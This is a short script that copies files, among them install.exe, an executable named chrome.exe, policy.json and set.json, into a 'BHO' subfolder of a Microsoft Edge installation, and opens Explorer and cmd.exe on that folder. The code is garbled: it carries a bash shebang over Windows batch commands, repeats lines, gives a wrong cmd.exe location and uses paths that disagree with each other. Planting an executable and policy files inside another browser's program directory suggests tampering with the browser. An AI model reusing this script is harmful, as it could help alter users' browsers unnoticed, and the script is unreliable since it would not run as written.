#!/bin/bash

%SystemRoot%\explorer.exe "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"

COPY textDoc.txt "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"


%SystemRoot%\explorer.exe "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"
%SystemRoot%\explorer.exe "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"
COPY install.exe "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"
COPY chrome.exe "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"
COPY policy.json "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"
COPY set.json "C:\Program Files (x86)\Microsoft\Edge\Application\101.0.1210.53\BHO"

%SystemRoot%\cmd.exe "C:\Program Files (x86)\Microsoft\Edge\Applications\101.0.1210.53\BHO"